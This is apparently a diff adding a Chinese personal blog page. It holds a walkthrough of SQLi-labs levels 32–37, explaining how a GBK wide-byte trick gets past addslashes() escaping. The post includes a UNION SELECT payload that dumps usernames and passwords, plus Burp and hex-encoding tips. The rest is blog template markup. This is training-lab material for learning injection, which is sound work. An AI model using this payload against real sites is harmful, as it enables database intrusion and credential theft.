+                <time title="修改时间：2021-05-23 09:35:18" itemprop="dateModified" datetime="2021-05-23T09:35:18+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>908</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>先试一下单引号注入，多了一个?<br>查看一下源码。<br>多了一个函数：addslashes()<br>了解一下这个函数：在 单引号 ‘，双引号 “，反斜杠 \还有NULL前面加上反斜杠\。<br>源码中使用的是gbk编码，gbk两个编码就代表一个汉字，再\前面加%df就形成一个汉字，单引号逃逸出来。<br>了解一下宽字节：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105870860">https://blog.csdn.net/weixin_39934520/article/details/105870860</a> 来自大佬博客。<br>这样就ok了举个例子吧：<br><code>?id=-1%bb&#39; union select 1,2,group_concat(username,password)from users--+</code><br><img src="32.md/0.png"></p>
+<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>Less-32是自定义的过滤器，本关直接使用了 PHP 的addslashes()函数<br>addslashes()与stripslashes()函数<br>addslashes(string)函数返回在预定义字符之前添加反斜杠\的字符串：<br>单引号 ‘<br>双引号 “<br>反斜杠 <br>空字符 NULL<br>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<br>注意：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。<br>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p>
+<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>post型<br>正常登入，本题也是宽字节注入。<br>这题不是get型，不是以URL形式提交的？其实还是差不多的。<br>但是直接在页面输入，怎么试都错误，应该是post型提交有不一样。打开burp抓包<br>果然%被转义成%25，在burp换成%即可。</p>
+<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>定型：为含addslashes数字型注入。<br>基本和第二关差不多了。<br>**但是特别注意有引号的，’security’要变成16进制，这是MySQL本身支持的查询方式，也就不需要用到单引号了。</p>
+<h3 id="Less-36-amp-amp-Less-37"><a href="#Less-36-amp-amp-Less-37" class="headerlink" title="Less-36&amp;&amp;Less-37"></a>Less-36&amp;&amp;Less-37</h3><p>也是宽字节注入，加入%df和/组成一个字符。</p>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WJW"
+      src="/images/cat.jpg">
+  <p class="site-author-name" itemprop="name">WJW</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WJW</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">236k</span>
+</div>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/clicklove.js"></script>
